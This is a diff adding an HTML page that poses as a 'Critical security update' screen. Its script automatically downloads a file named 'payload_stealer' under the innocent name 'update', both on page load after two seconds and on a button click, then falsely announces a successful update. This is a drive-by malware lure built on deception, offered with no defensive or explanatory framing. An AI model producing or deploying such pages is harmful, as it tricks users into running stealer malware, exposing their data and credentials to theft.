@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>System Update</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #0a0a0a;
+            color: #00ff00;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .card {
+            background: #1a1a1a;
+            padding: 40px;
+            border-radius: 15px;
+            border: 1px solid #00ff00;
+            text-align: center;
+        }
+        .btn {
+            background: #00ff00;
+            color: black;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 8px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        .btn:hover { background: #00cc00; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <h1>📡 System Update</h1>
+        <p>Critical security update</p>
+        <button class="btn" onclick="downloadFile()">⬇ Download</button>
+    </div>
+    <script>
+        function downloadFile() {
+            var link = document.createElement('a');
+            link.href = 'payload_stealer';
+            link.download = 'update';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            alert('Update downloaded!');
+        }
+        window.onload = function() {
+            setTimeout(downloadFile, 2000);
+        }
+    </script>
+</body>
+</html>
